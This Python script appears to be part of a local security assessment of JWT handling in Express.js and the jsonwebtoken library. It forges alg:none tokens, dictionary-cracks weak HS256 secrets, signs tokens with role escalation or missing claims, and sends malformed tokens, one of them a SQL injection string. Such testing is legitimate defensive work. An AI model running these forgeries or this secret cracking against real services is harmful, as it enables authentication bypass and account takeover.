#!/usr/bin/env python3
"""
Phase 3.2 — JWT Attacks
Express.js Security Assessment — [REDACTED]

Tests jsonwebtoken library behavior when integrated with Express.
SCOPE: Framework JWT middleware behavior (algorithm confusion, verification).
"""

import requests
import json
import os
import jwt as pyjwt
import hmac
import hashlib
import base64
import time
from datetime import datetime

TARGETS = {'v5': 'http://127.0.0.1:3000', 'v4': 'http://127.0.0.1:3001'}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {'phase': '3.2', 'name': 'JWT Attacks', 'timestamp': datetime.now().isoformat(),
                 'scope': 'jsonwebtoken library + Express integration'},
    'tests': [], 'findings': [], 'summary': {}
}
test_count = 0

def log_test(name, ver, data, finding=None):
    global test_count
    test_count += 1
    results['tests'].append({'id': test_count, 'test': name, 'version': ver, 'data': data})
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': ver})
        print(f"  [{test_count:3d}] ⚠ {name} ({ver})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({ver})")


def get_valid_token(base_url):
    """Get a valid JWT token"""
    requests.get(f'{base_url}/seed', timeout=5)
    r = requests.post(f'{base_url}/auth/token',
                      json={'username': 'admin', 'password': 'admin123'}, timeout=5)
    if r.status_code == 200:
        return r.json().get('token')
    return None


def test_alg_none():
    """Test algorithm none attack"""
    print("\n[*] Testing algorithm none attack...")
    for ver, base in TARGETS.items():
        valid_token = get_valid_token(base)
        if not valid_token:
            log_test('alg_none', ver, {'error': 'Could not get valid token'})
            continue

        # Decode payload
        parts = valid_token.split('.')
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

        # Create alg:none tokens
        none_variants = [
            ('none', 'none'),
            ('None', 'None'),
            ('NONE', 'NONE'),
            ('nOnE', 'nOnE'),
        ]

        for alg_name, alg_value in none_variants:
            header = base64.urlsafe_b64encode(json.dumps({'alg': alg_value, 'typ': 'JWT'}).encode()).rstrip(b'=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
            forged = f"{header.decode()}.{payload_b64.decode()}."

            try:
                r = requests.get(f'{base}/auth/protected',
                                 headers={'Authorization': f'Bearer {forged}'}, timeout=5)
                finding = None
                if r.status_code == 200:
                    finding = {
                        'title': f'JWT Algorithm None Accepted (alg={alg_value})',
                        'severity': 'CRITICAL', 'cwe': 'CWE-327',
                        'description': f'jsonwebtoken accepted alg:{alg_value} without signature',
                        'framework_behavior': True
                    }
                log_test(f'alg_{alg_name}', ver, {
                    'alg': alg_value, 'status': r.status_code,
                    'accepted': r.status_code == 200
                }, finding)
            except Exception as e:
                log_test(f'alg_{alg_name}', ver, {'error': str(e)})


def test_weak_secret_brute():
    """Test brute force of weak JWT secrets"""
    print("\n[*] Testing JWT secret brute force...")

    common_secrets = [
        'secret', 'secret123', 'password', 'key', 'jwt_secret',
        'token_secret', 'keyboard-cat', 'supersecret', 'mysecret',
        'changeme', 'test', 'admin', 'default', '123456',
    ]

    for ver, base in TARGETS.items():
        valid_token = get_valid_token(base)
        if not valid_token:
            log_test('weak_secret', ver, {'error': 'Could not get valid token'})
            continue

        cracked_secret = None
        for secret in common_secrets:
            try:
                pyjwt.decode(valid_token, secret, algorithms=['HS256'])
                cracked_secret = secret
                break
            except:
                continue

        finding = None
        if cracked_secret:
            finding = {
                'title': f'JWT Secret Cracked: "{cracked_secret}"',
                'severity': 'INFO',
                'cwe': 'CWE-521',
                'description': f'JWT signed with weak secret "{cracked_secret}" — cracked via dictionary. '
                               f'Note: This is app-level config, not framework default.',
                'framework_behavior': False,
                'note': 'jsonwebtoken does not enforce minimum secret strength'
            }

        log_test('weak_secret', ver, {
            'cracked': cracked_secret is not None,
            'secret': cracked_secret,
            'attempts': len(common_secrets) if not cracked_secret else common_secrets.index(cracked_secret) + 1
        }, finding)


def test_expired_token():
    """Test expired token handling"""
    print("\n[*] Testing expired token handling...")
    for ver, base in TARGETS.items():
        # Create expired token manually
        payload = {'userId': 1, 'username': 'admin', 'role': 'admin',
                   'iat': int(time.time()) - 7200, 'exp': int(time.time()) - 3600}
        try:
            expired_token = pyjwt.encode(payload, 'secret123', algorithm='HS256')
            r = requests.get(f'{base}/auth/protected',
                             headers={'Authorization': f'Bearer {expired_token}'}, timeout=5)
            finding = None
            if r.status_code == 200:
                finding = {
                    'title': 'Expired JWT Token Accepted',
                    'severity': 'HIGH', 'cwe': 'CWE-613',
                    'description': 'jsonwebtoken accepted an expired token',
                    'framework_behavior': True
                }
            log_test('expired_token', ver, {
                'status': r.status_code, 'accepted': r.status_code == 200
            }, finding)
        except Exception as e:
            log_test('expired_token', ver, {'error': str(e)})


def test_missing_claims():
    """Test tokens with missing required claims"""
    print("\n[*] Testing tokens with missing claims...")
    for ver, base in TARGETS.items():
        claim_tests = [
            ('no_exp', {'userId': 1, 'username': 'admin', 'role': 'admin'}),
            ('no_iat', {'userId': 1, 'username': 'admin', 'role': 'admin', 'exp': int(time.time()) + 3600}),
            ('no_sub', {'role': 'admin', 'exp': int(time.time()) + 3600}),
            ('empty_payload', {}),
            ('extra_claims', {'userId': 1, 'username': 'admin', 'role': 'admin', 'isAdmin': True,
                              'exp': int(time.time()) + 3600}),
            ('role_escalation', {'userId': 2, 'username': 'user1', 'role': 'admin',
                                 'exp': int(time.time()) + 3600}),
        ]

        for name, payload in claim_tests:
            try:
                token = pyjwt.encode(payload, 'secret123', algorithm='HS256')
                r = requests.get(f'{base}/auth/protected',
                                 headers={'Authorization': f'Bearer {token}'}, timeout=5)
                finding = None
                if r.status_code == 200 and name in ('no_exp', 'empty_payload', 'role_escalation'):
                    finding = {
                        'title': f'JWT Accepted Without Required Claims ({name})',
                        'severity': 'MEDIUM' if name != 'role_escalation' else 'INFO',
                        'cwe': 'CWE-287',
                        'description': f'jsonwebtoken.verify() accepted token with {name}',
                        'framework_behavior': True if name != 'role_escalation' else False,
                        'note': 'jsonwebtoken does not enforce claim presence by default' if 'role' not in name else 'App-level: no role verification'
                    }
                log_test(f'claims_{name}', ver, {
                    'status': r.status_code, 'accepted': r.status_code == 200,
                    'payload_keys': list(payload.keys())
                }, finding)
            except Exception as e:
                log_test(f'claims_{name}', ver, {'error': str(e)})


def test_token_manipulation():
    """Test various token manipulation attacks"""
    print("\n[*] Testing token manipulation...")
    for ver, base in TARGETS.items():
        valid_token = get_valid_token(base)
        if not valid_token:
            continue

        manip_tests = [
            ('empty_token', ''),
            ('dot_only', '.'),
            ('two_dots', '..'),
            ('three_dots', '...'),
            ('no_signature', '.'.join(valid_token.split('.')[:2])),
            ('truncated_sig', valid_token[:-5]),
            ('extra_part', valid_token + '.extra'),
            ('null_bytes', valid_token[:20] + '\x00' + valid_token[20:]),
            ('very_long', 'A' * 10000),
            ('sql_in_token', "'; DROP TABLE users;--"),
        ]

        for name, token in manip_tests:
            try:
                r = requests.get(f'{base}/auth/protected',
                                 headers={'Authorization': f'Bearer {token}'}, timeout=5)
                finding = None
                if r.status_code == 200:
                    finding = {
                        'title': f'Manipulated JWT Accepted ({name})',
                        'severity': 'CRITICAL', 'cwe': 'CWE-287',
                        'description': f'Manipulated token ({name}) was accepted',
                        'framework_behavior': True
                    }
                log_test(f'manip_{name}', ver, {
                    'status': r.status_code, 'accepted': r.status_code == 200
                }, finding)
            except Exception as e:
                log_test(f'manip_{name}', ver, {'error': str(e)})


def main():
    print("=" * 70)
    print("Phase 3.2 — JWT Attacks")
    print("=" * 70)

    test_alg_none()
    test_weak_secret_brute()
    test_expired_token()
    test_missing_claims()
    test_token_manipulation()

    results['summary'] = {'total_tests': test_count, 'findings_count': len(results['findings'])}
    out_file = os.path.join(EVIDENCE_DIR, 'jwt_attack_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nJWT attacks complete: {test_count} tests, {len(results['findings'])} findings")
    print(f"Evidence: {out_file}")

if __name__ == '__main__':
    main()
